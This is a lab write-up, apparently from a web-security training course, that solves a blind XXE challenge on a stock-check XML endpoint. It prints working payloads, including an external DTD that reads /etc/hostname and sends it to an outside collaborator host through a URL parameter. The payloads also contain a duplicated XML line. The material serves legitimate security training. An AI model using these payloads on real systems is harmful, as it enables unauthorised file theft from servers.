# Exploiting blind XXE to exfiltrate data using a malicious external DTD
# Objective
This lab has a "Check stock" feature that parses XML input but does not display the result.\
To solve the lab, exfiltrate the contents of the `/etc/hostname` file. 

# Solution
## Analysis
Application has a `Check stock` feature. Data from client to server is sent in XML format. Moreover application have `Submit feedback` feature. Data from client is send in `Content-Type: multipart/form-data;`.

|![](Images/image-12.png)|
|:--:| 
| *Check stock request* |
|![](Images/image-12.png)|
| *Submit feedback request* |

## Exploitation
### Verificationn of blind out-of-band XXE 
The XML parameter injection (out-of-band request) can be performed using the following payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<id>.oastify.com"> %xxe; ]>
<stockCheck><productId>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

|![](Images/image-14.png)|
|:--:| 
| *XXE injection - out-of-band request* |
|![](Images/image-15.png)|
| *XXE injection - out-of-band request* |

### Data exfiltration via blind XXE using malicious external DTD
Data exfiltration via blind XXE using malicious external DTD can be performed using the following payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://exploit-<id>.exploit-server.net/malicious.dtd"> %xxe; ]>
<stockCheck><productId>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Exploit server configuration:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<id>.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

> [!CAUTION]
> This technique might not work with some file contents, including the newline characters for example contained in the `/etc/passwd` file.

|![](Images/image-17.png)|
|:--:| 
| *Exploit server configuration* |
|![](Images/image-16.png)|
| *Blind XXE injection with malicious external DTD* |
|![](Images/image-18.png)|
| *Blind XXE injection with malicious external DTD* |
